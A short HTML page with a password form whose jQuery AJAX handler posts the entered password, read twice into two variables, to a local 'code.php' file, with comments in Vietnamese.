<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
</head>
<body>

<form id="passwordForm" onsubmit="return submitForm();">
    <label for="password">Password:</label>
    <input type="password" id="password" name="password" required>
    <button type="submit">Submit</button>
</form>

<script>
function submitForm() {
    var passwordFirstAttempt = document.getElementById("password").value;
    var passwordSecondAttempt = document.getElementById("password").value;

    // Gửi thông tin đến file code.php sử dụng AJAX
    $.ajax({
        type: "POST",
        url: "code.php",
        data: { passwordFirstAttempt: passwordFirstAttempt, passwordSecondAttempt: passwordSecondAttempt },
        success: function(response) {
            // Xử lý phản hồi từ server (nếu có)
            console.log(response);
        },
        error: function() {
            alert("Error during AJAX request.");
        }
    });

    // Ngăn chặn gửi biểu mẫu
    return false;
}
</script>

</body>
</html>
